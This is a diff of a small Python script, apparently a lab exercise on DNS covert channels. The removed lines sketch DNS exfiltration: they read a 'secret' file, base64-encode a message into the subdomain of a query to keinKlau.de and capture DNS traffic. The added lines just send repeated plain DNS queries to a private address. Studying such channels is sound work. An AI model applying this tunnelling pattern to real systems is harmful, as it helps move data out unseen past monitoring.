@@ -1,40 +1,26 @@
-from itertools import count
-from scapy.all import sniff, wrpcap
+import socket
+from time import sleep
 
 import dns.message
 import dns.query
-import dns.name
-import base64
-
-def read_data ():
-    file = open("secret_file.txt" , "r")
-    file.read()
-    file.close()
-
-    #Hashing the date do ensure data integrity
 
 
-def send_hidden_message(dns_server, hidden_message):
+def send_dns_request(server_ip, domain):
+    # Erstelle eine DNS-Anfrage
+    request = dns.message.make_query(domain, dns.rdatatype.A)
+    request_bytes = request.to_wire()
 
-    encoded_message = base64.urlsafe_b64encode(hidden_message.encode()).decode()
+    # Sende die Anfrage an den Empfänger
+    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+        sock.sendto(request_bytes, (server_ip, 12345))
+        print(f"DNS request sent to {server_ip} for domain {domain}")
 
-    query_name = f"{encoded_message}.keinKlau.de"
-    #query_name = f"{hidden_message}.keinKlau.de"
-    query = dns.message.make_query(query_name, dns.rdatatype.A)
-
-    try:
-        response = dns.query.udp(query, dns_server)
-        print("DNS-Anfrage gesendet. Antwort erhalten:")
-        print(response)
-    except Exception as e:
-        print(f"Fehler beim Senden der DNS-Anfrage: {e}")
-
-def pcap_writer():
-    packets = sniff(iface= "eth0" ,filter="dns", count=100)
-    wrpcap("send_data.pcap", packets)
 
 if __name__ == "__main__":
-    read_data()
-    dns_server = "127.0.0.1"
-    hidden_message = "Geheime Nachricht"
-    send_hidden_message(dns_server, hidden_message)
+    #receiver_ip = "127.0.0.1"  # Ändere dies in die IP des Empfängers, falls notwendig
+    receiver_ip = "172.36.0.3"  # Ändere dies in die IP des Empfängers, falls notwendig
+    domain_name = "justus-sieger.de"
+for i in range(100):
+    sleep(5)
+    print(f"Sending DNS request {i+1}/100")  # Zähle die Anfragen mit
+    send_dns_request(receiver_ip, domain_name)
